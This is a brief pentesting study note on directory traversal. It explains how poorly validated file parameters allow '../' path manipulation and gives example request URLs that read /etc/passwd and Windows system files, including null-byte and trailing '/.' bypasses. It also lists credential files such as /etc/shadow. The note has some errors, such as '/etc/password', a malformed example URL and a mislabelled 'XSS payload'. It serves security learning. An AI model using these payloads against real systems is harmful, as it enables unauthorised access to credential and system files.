Allows attackers to gain unauthorized access to files within an app or files not normally accessible through a web interface.  
This vuln occurs when input is poorly validated allowing for manipulation of file paths with _**../**_ or _**..\\**_  
  
Can be used to help facilitate [file inclusion](9.2%20-%20File%20Inclusion.md) attacks.  


Found by examining URL query strings and form bodies in search of values that appear as file references (inc file extensions in URL query strings)  
Ex URL:  
```null
target.com/menu.php?file=current_menu.php
```

A file ext on a parameter value can suggest that text or code is being included from a different resource. (Most aren't that ^ obvious)  
  
Depending on the error message received after playing with the ‘file’ parameter value, we may determine the OS and be able to adjust the XSS payload to target specific files  
Ex URL:  
```null
http://target.com/menu.php?file=c:\windows\system32\drivers\etc\hosts
```


Useful Linux directories & files:  
- /etc/password  
- /etc/shadow  
- /etc/hosts  
  

Useful Windows directories & files:  
- C\:\\boot.ini  
- C\:\\windows\\system32\\drivers\\etc\\hosts  
  
  
### Null Bytes:
Developers can specify the type of file it's looking for:  
```null
http://target.com/menu.php?file=/etc/passwd
```

becomes
```null
http://target.com/menu.php?file/etc/passwd.php
```

  
Adding the Null Byte _%00_ or _0x00_ to terminate the string and trick the webapp into ignoring everything else afterwards:  
```null
http://target.com/menu.php?file=/etc/passwd%00
```


*This is patched in PHP 5.3.4 and above  
  
If the files are blocked, can attempt to view them by adding a _./_ at the end:  
```null
http://target.com/menu.php?file=../../../../etc/passwd/.
```
